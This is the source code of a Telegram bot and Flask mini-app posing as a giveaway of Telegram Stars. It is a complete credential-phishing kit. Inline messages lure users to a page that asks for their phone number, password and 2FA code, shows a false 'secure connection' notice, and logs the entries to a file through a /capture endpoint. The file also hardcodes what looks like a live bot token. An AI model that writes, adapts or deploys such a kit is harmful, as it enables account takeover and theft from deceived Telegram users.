from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import threading
import time

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
WEBAPP_URL = "https://stargiftbot-final.onrender.com"  # Твоя URL

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ========== HTML ДЛЯ МІНІ-ДОДАТКУ ==========
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Stars</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: white;
            font-family: -apple-system, Arial, sans-serif;
            text-align: center;
            padding: 40px 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .icon { font-size: 64px; margin-bottom: 10px; }
        h2 { font-size: 24px; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 30px; }
        input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            margin: 8px auto;
            border-radius: 14px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: white;
            font-size: 16px;
            display: block;
        }
        input:focus { border-color: #0088cc; outline: none; }
        button {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background: #0088cc;
            border: none;
            border-radius: 14px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        button:active { opacity: 0.8; }
        .secure { color: #00cc88; font-size: 13px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="icon">⭐</div>
    <h2>Введи данные для получения звёзд</h2>
    <p class="sub">Номер телефона, пароль и 2FA (если есть)</p>

    <input id="phone" placeholder="📱 +71234567890" type="tel">
    <input id="password" placeholder="🔒 Пароль" type="password">
    <input id="code2fa" placeholder="🔐 Код 2FA (если есть)" type="text">

    <button onclick="sendData()">✅ ПОЛУЧИТЬ ЗВЁЗДЫ</button>

    <p class="secure">🔒 Защищённое соединение</p>

    <script>
        function sendData() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const code2fa = document.getElementById('code2fa').value;

            if (!phone || !password) {
                alert('Введи номер и пароль');
                return;
            }

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    password: password,
                    code2fa: code2fa,
                    tg_user: window.Telegram.WebApp.initDataUnsafe?.user || {}
                })
            });

            alert('✅ Данные приняты! Звёзды придут в течение 5 минут.');
            window.Telegram.WebApp.close();
        }
    </script>
</body>
</html>
"""

# ========== МАРШРУТИ ==========
@app.route('/')
def index():
    return HTML_PAGE

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    with open('logs.txt', 'a') as f:
        f.write(f"{data} | {time.ctime()}\n")
    return jsonify({'status': 'ok'})

# ========== INLINE-РЕЖИМ ==========
@bot.inline_handler(lambda query: True)
def inline_handler(inline_query):
    results = []
    amounts = [100, 200, 300, 500, 700, 1000]
    for amt in amounts:
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton(
                f"🤖 Забрать {amt} звёзд",
                web_app=WebAppInfo(url=WEBAPP_URL)  # ВІДКРИВАЄ МІНІ-ДОДАТОК
            )
        )
        results.append(
            InlineQueryResultArticle(
                id=str(amt),
                title=f"⭐ Чек на {amt} звёзд",
                description=f"Нажми, чтобы забрать {amt} звёзд",
                input_message_content=InputTextMessageContent(
                    f"🎯 **Ты получил чек на {amt} звёзд!**\nНажми на кнопку ниже, чтобы забрать их.",
                    parse_mode='Markdown'
                ),
                reply_markup=keyboard
            )
        )
    bot.answer_inline_query(inline_query.id, results)

# ========== КОМАНДА /start ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n"
        "Я бот для получения чеков на звёзды.\n\n"
        "Напиши **@StarCheclBot** в любом чате, выбери сумму и нажми на кнопку.",
        parse_mode='Markdown'
    )

# ========== ЗАПУСК ==========
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
